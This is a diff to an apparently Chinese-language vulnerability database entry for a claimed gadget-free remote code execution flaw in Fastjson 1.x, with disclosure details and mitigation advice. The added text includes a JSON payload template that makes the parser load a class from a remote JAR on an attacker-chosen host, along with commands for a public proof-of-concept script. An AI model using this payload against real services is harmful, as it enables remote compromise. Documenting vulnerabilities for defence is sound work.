@@ -1,10 +1,18 @@
 vendor = "Alibaba"
-name = "Fastjson 1.2.83 无 Gadget 远程代码执行漏洞"
+name = "Fastjson 1.2.83 @JSONType Resource Probe 纯库无 Gadget RCE 漏洞"
 type = "RCE"
-version = "Fastjson 1.2.83（1.x 最终版）"
-detail = """Fastjson 1.2.83（1.x 系列最终版本）被发现存在无需 classpath gadget 的远程代码执行漏洞。攻击者无需特定反序列化 gadget 链，仅需单个 payload 即可实现 RCE。该漏洞影响范围广，Fastjson 1.x 仍是生产环境中最广泛部署的 Java JSON 库之一。
-最早披露: 2026-07-17（Kirill Firsov 公开）"""
-fix = "升级至 Fastjson 2.x 版本；临时措施：在无法升级时通过 WAF 拦截可疑的 JSON 请求内容；限制 Fastjson 解析接口的访问来源。"
+version = "Fastjson 1.2.66 ~ 1.2.83（1.x 系列）"
+detail = """Fastjson 1.x 系列（1.2.66~1.2.83）存在无需 classpath gadget 的纯库远程代码执行漏洞。攻击者利用 @JSONType 注解的资源探测机制，通过 jar: 协议构造恶意 JSON payload（如 {"@type":"jar:http:..<host>:<port>.probe!.POC","x":1}），触发 Fastjson 在解析时自动加载远程 JAR 文件中的类，实现无需任何依赖 gadget 的纯 RCE。该漏洞影响范围极广，Fastjson 1.x 是生产环境中最广泛部署的 Java JSON 库之一。
+CVE: 暂未分配
+GitHub PoC: 公开 PoC 脚本可用
+最早披露: 2026-07-17（Kirill Firsov 公开）
+PoC:
+```
+python3 fastjson_poc.py setup    # 下载依赖+编译+生成probe.jar
+python3 fastjson_poc.py verify   # 一键验证
+python3 fastjson_poc.py payload  # 打印JSON payload
+```"""
+fix = "升级至 Fastjson 2.x 版本；临时措施：在无法升级时通过 WAF 拦截包含 jar:http: 协议的 JSON payload；限制 Fastjson 解析接口对外部网络的访问；在安全组层面阻止服务器主动出站连接到不可信主机。"
 date = 20260717
 label = "0day"
 verifier = "AdySec"
